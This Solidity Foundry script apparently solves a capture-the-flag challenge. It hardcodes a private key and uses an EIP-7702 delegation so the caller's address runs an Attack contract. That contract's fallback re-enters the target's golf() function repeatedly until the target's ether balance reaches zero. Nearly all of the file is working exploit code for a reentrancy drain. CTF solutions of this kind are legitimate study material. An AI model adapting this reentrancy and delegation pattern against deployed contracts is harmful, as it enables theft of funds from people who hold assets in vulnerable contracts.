// SPDX-License-Identifier: MIT
// Author: Hanz
pragma solidity ^0.8.0;

// forge script script/Solve.s.sol:Solve --rpc-url $ETH_RPC_URL --evm-version prague --no-cache --broadcast --with-gas-price 0 --priority-gas-price 0

import {Script, console} from "forge-std/Script.sol";
import {Vm} from "forge-std/Vm.sol";

interface IChallenge {
    function golf() external;
}

contract Solve is Script {
    IChallenge c = IChallenge(vm.envAddress("TARGET"));
    uint PK;
    address ADDR;
    Attack a;

    function run() public {
        // ETH Address: 0x00001e904107dde914947f7B75C97C2bA37AFCa2
        // ETH Privkey: 0x8df30866d1ccb611ca8a5b6d9130001b2136191b444445353904880e8527d068
        PK = 0x8df30866d1ccb611ca8a5b6d9130001b2136191b444445353904880e8527d068;
        ADDR = vm.addr(PK);
        vm.startBroadcast(PK);
        a = new Attack();

        Vm.SignedDelegation memory signedDelegation = vm.signDelegation(address(a), PK);
        vm.attachDelegation(signedDelegation);

        bytes memory code = ADDR.code;
        require(code.length > 0, "EIP-7702 setup incorrectly fails");

        Attack(payable(ADDR)).setup(address(c));
        console.log(address(c).balance);
        c.golf();
        console.log(address(c).balance);

        assert(address(c).balance == 0);
        console.log("Success");
    }
}

contract Attack {
    IChallenge c;
    uint iteration;

    constructor() { /* EIP7702 */ }

    function setup(address _c) external {
        c = IChallenge(_c);
    }

    fallback() external payable {
        iteration++;
        if (iteration < 10) {
            c.golf();
        }
        
        assembly {
            mstore(0, 1)
            return(0, 32)
        }
    }
}